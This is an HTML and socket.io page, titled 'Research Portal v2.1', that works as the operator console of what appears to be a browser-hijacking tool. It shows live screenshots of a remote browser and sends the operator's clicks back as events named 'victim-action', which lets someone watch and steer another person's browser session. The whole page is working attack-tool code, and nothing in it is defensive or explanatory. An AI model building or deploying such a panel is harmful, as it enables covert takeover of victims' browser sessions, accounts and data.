<!DOCTYPE html>
<html>
<head>
    <title>Research Portal v2.1</title>
    <style>
        body { background: #0a0a0a; color: #e0e0e0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; margin: 0; padding: 20px; }
        #container { position: relative; border: 1px solid #333; }
        #screen-mirror { width: 1280px; height: 720px; background: #000; display: block; cursor: crosshair; }
        .status-bar { width: 1280px; background: #1a1a1a; padding: 10px; border-bottom: 1px solid #333; font-size: 14px; }
        #status-msg { color: #ffae00; font-weight: bold; }
    </style>
</head>
<body>
    <div class="status-bar">
        STATUS: <span id="status-msg">CONNECTING...</span>
    </div>
    <div id="container">
        <img id="screen-mirror" src="" />
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Force WebSocket transport to prevent 400 Bad Request on Railway/Cloudflare
        const socket = io({
            transports: ['websocket'],
            upgrade: false
        });

        const img = document.getElementById('screen-mirror');
        
        socket.on('connect', () => {
            document.getElementById('status-msg').innerText = "CONNECTED - WAITING FOR BROWSER";
            document.getElementById('status-msg').style.color = "#00ff00";
        });

        socket.on('browser-render', (data) => {
            img.src = 'data:image/jpeg;base64,' + data.screenshot;
        });

        img.addEventListener('click', (e) => {
            const rect = img.getBoundingClientRect();
            const x = (e.clientX - rect.left) * (1280 / rect.width);
            const y = (e.clientY - rect.top) * (720 / rect.height);
            socket.emit('victim-action', { type: 'click', x, y });
        });

        socket.on('connect_error', (err) => {
            document.getElementById('status-msg').innerText = "WS ERROR: " + err.message;
            document.getElementById('status-msg').style.color = "red";
        });
    </script>
</body>
</html>
